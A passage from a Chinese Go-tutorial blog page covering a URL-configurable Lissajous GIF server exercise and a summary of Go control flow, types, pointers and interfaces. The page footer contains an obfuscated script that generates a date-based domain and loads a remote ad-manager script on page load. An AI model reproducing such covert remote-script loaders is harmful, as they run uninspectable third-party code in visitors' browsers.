	<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> r<span class="token punctuation">.</span>Form <span class="token punctuation">{<!-- --></span>
		fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Form[%q] = %q\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/52/5b/1QX98qxP_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_1006"></a>练习</h4> 
<h5><a id="112_1008"></a>练习1.12：</h5> 
<blockquote> 
 <p>修改Lissajour服务，从URL读取变量，比如你可以访问http://localhost:8000/?cycles=20 这个URL，这样访问可以将程序里的cycles默认的5修改为20。字符串转换为数字可以调用strconv.Atoi函数。你可以在godoc里查看strconv.Atoi的详细说明</p> 
</blockquote> 
<pre><code class="prism language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"image"</span>
	<span class="token string">"image/color"</span>
	<span class="token string">"image/gif"</span>
	<span class="token string">"io"</span>
	<span class="token string">"log"</span>
	<span class="token string">"math"</span>
	<span class="token string">"math/rand"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"strconv"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> palette <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>color<span class="token punctuation">.</span>Color<span class="token punctuation">{<!-- --></span>color<span class="token punctuation">.</span>White<span class="token punctuation">,</span> color<span class="token punctuation">.</span>Black<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token punctuation">(</span>
	whiteIndex <span class="token operator">=</span> <span class="token number">0</span>
	blackIndex <span class="token operator">=</span> <span class="token number">1</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> lconfig <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
	cycles <span class="token builtin">float64</span>
	res    <span class="token builtin">float64</span>
	freq   <span class="token builtin">float64</span>
	size   <span class="token builtin">int</span>
	frames <span class="token builtin">int</span>
	delay  <span class="token builtin">int</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">UnixNano</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	lconf <span class="token operator">:=</span> lconfig<span class="token punctuation">{<!-- --></span>
		cycles<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
		res<span class="token punctuation">:</span>    <span class="token number">0.001</span><span class="token punctuation">,</span>
		freq<span class="token punctuation">:</span>   rand<span class="token punctuation">.</span><span class="token function">Float64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3.0</span><span class="token punctuation">,</span>
		size<span class="token punctuation">:</span>   <span class="token number">100</span><span class="token punctuation">,</span>
		frames<span class="token punctuation">:</span> <span class="token number">64</span><span class="token punctuation">,</span>
		delay<span class="token punctuation">:</span>  <span class="token number">8</span><span class="token punctuation">,</span>
	<span class="token punctuation">}</span>

	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		confs <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token operator">:=</span> <span class="token keyword">range</span> confs <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">switch</span> i <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">case</span> <span class="token string">"cycles"</span><span class="token punctuation">:</span>
				lconf<span class="token punctuation">.</span>cycles<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseFloat</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>
			<span class="token keyword">case</span> <span class="token string">"freq"</span><span class="token punctuation">:</span>
				lconf<span class="token punctuation">.</span>freq<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseFloat</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>
			<span class="token keyword">case</span> <span class="token string">"res"</span><span class="token punctuation">:</span>
				lconf<span class="token punctuation">.</span>res<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseFloat</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>
			<span class="token keyword">case</span> <span class="token string">"size"</span><span class="token punctuation">:</span>
				lconf<span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
			<span class="token keyword">case</span> <span class="token string">"frames"</span><span class="token punctuation">:</span>
				lconf<span class="token punctuation">.</span>frames<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
			<span class="token keyword">case</span> <span class="token string">"delay"</span><span class="token punctuation">:</span>
				lconf<span class="token punctuation">.</span>delay<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>

		<span class="token function">lissajous</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> lconf<span class="token punctuation">)</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>

	log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">"localhost:8000"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">lissajous</span><span class="token punctuation">(</span>out io<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> set lconfig<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	anim <span class="token operator">:=</span> gif<span class="token punctuation">.</span>GIF<span class="token punctuation">{<!-- --></span>LoopCount<span class="token punctuation">:</span> set<span class="token punctuation">.</span>frames<span class="token punctuation">}</span>
	phase <span class="token operator">:=</span> <span class="token number">0.0</span> <span class="token comment">// phase difference</span>
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> set<span class="token punctuation">.</span>frames<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
		rect <span class="token operator">:=</span> image<span class="token punctuation">.</span><span class="token function">Rect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>set<span class="token punctuation">.</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>set<span class="token punctuation">.</span>size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
		img <span class="token operator">:=</span> image<span class="token punctuation">.</span><span class="token function">NewPaletted</span><span class="token punctuation">(</span>rect<span class="token punctuation">,</span> palette<span class="token punctuation">)</span>
		<span class="token keyword">for</span> t <span class="token operator">:=</span> <span class="token number">0.0</span><span class="token punctuation">;</span> t <span class="token operator">&lt;</span> set<span class="token punctuation">.</span>cycles<span class="token operator">*</span><span class="token number">2</span><span class="token operator">*</span>math<span class="token punctuation">.</span>Pi<span class="token punctuation">;</span> t <span class="token operator">+=</span> set<span class="token punctuation">.</span>res <span class="token punctuation">{<!-- --></span>
			x <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">Sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>
			y <span class="token operator">:=</span> math<span class="token punctuation">.</span><span class="token function">Sin</span><span class="token punctuation">(</span>t<span class="token operator">*</span>set<span class="token punctuation">.</span>freq <span class="token operator">+</span> phase<span class="token punctuation">)</span>
			img<span class="token punctuation">.</span><span class="token function">SetColorIndex</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>size<span class="token operator">+</span><span class="token function">int</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token function">float64</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> set<span class="token punctuation">.</span>size<span class="token operator">+</span><span class="token function">int</span><span class="token punctuation">(</span>y<span class="token operator">*</span><span class="token function">float64</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> blackIndex<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		phase <span class="token operator">+=</span> <span class="token number">0.1</span>
		anim<span class="token punctuation">.</span>Delay <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>anim<span class="token punctuation">.</span>Delay<span class="token punctuation">,</span> set<span class="token punctuation">.</span>delay<span class="token punctuation">)</span>
		anim<span class="token punctuation">.</span>Image <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>anim<span class="token punctuation">.</span>Image<span class="token punctuation">,</span> img<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	gif<span class="token punctuation">.</span><span class="token function">EncodeAll</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token operator">&amp;</span>anim<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

</code></pre> 
<h3><a id="08__1102"></a>08 本章要点</h3> 
<h4><a id="_1104"></a>控制流</h4> 
<ul><li> <p>if</p> </li><li> <p>for</p> </li><li> <p>switch</p> <pre><code class="prism language-go"><span class="token keyword">switch</span> <span class="token function">coinflip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">case</span> <span class="token string">"heads"</span><span class="token punctuation">:</span>
    	heads<span class="token operator">++</span>
    <span class="token keyword">case</span> <span class="token string">"tails"</span><span class="token punctuation">:</span>
    	tails<span class="token operator">++</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"landed on edge!"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
  <ul><li> <p>Go 语言并不需要显式地在每一个case后写break，其默认执行完case后的逻辑语句会自动退出</p> </li><li> <p>Go 语言里的switch还可以不带操作对象，这时默认用true值代替，然后将每个case的表达式和true值进行比较，可以直接罗列各种条件，该形式叫做无tag switch，等价于 switch true</p> <pre><code class="prism language-go"><span class="token keyword">switch</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">case</span> x <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">:</span>
    	<span class="token keyword">return</span> <span class="token operator">+</span><span class="token number">1</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
    	<span class="token keyword">return</span> <span class="token number">0</span>
<span class="token punctuation">}</span>
</code></pre> </li><li> <p>像for和if控制语句一样，switch也可以紧跟一个简短的变量声明，一个自增表达式、赋值语句，或者一个函数调用</p> </li></ul> </li><li> <p>break 会中断当前的循环，并开始执行循环之后的内容</p> </li><li> <p>continue 会跳过当前循环，并开始执行下一次循环</p> </li></ul> 
<h4><a id="_1142"></a>命名类型</h4> 
<ul><li> <p>类型声明使得我们可以很方便地给一个特殊类型一个名字</p> <pre><code class="prism language-go"><span class="token keyword">type</span> Point <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
    X<span class="token punctuation">,</span> Y <span class="token builtin">int</span>
<span class="token punctuation">}</span>
</code></pre> </li></ul> 
<h4><a id="_1152"></a>指针</h4> 
<ul><li>指针是一种直接存储了变量的内存地址的数据类型 
  <ul><li>Go 语言中指针是可见的内存地址，但是在Go 语言里没有指针运算</li><li><code>&amp;</code>操作符可以返回一个变量的内存地址</li><li><code>*</code>操作符可以获取指针指向的变量内容</li></ul> </li></ul> 
<h4><a id="_1159"></a>方法和接口</h4> 
<ul><li>方法是和命名类型关联的一类函数</li><li>Go 语言里比较特殊的就是<code>方法可以被关联到任意一种命名类型</code></li><li>接口是一种抽象类型，其可以让我们以同样的方式来处理不同的固有类型，不用关心它们的具体实现而只需要关注它们提供的方法</li></ul> 
<h4><a id="packages_1165"></a>包（packages）</h4> 
<ul><li> <p>Go 语言里有一些很好用的package，并且这些package是可以扩展的</p> </li><li> <p>在写一个新程序之前可以先去检查一下是否存在现成的库可以帮助你更高效地完成这件事情</p> 
  <ul><li><a href="https://golang.org/pkg" rel="nofollow">https://golang.org/pkg</a></li><li><a href="https://godoc.org/" rel="nofollow">https://godoc.org</a></li></ul> </li></ul> 
<h4><a id="_1173"></a>注释</h4> 
<ul><li>源文件的开头写的注释是该源文件的文档</li><li>每一个函数之前写一个说明函数行为的注释</li><li>多行注释可以用 <code>/* ... */</code> 来包裹，在文件一开头的注释一般都是这种形式，或者一大段的解释性的注释文字也会使用多行注释，从而避免每一行都需要加<code>//</code></li><li>在注释中 <code>//</code> 和 <code>/*</code> 没有什么意义，因此不要在注释中再嵌入注释</li></ul>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0a2b2e268718862471d090d00f357edf/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">图像处理的基本流程</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0f70d38e26bab4b00e22328f0715bf90/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">byte[]转String后再用String转回byte[]与起始byte[]不一致问题</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>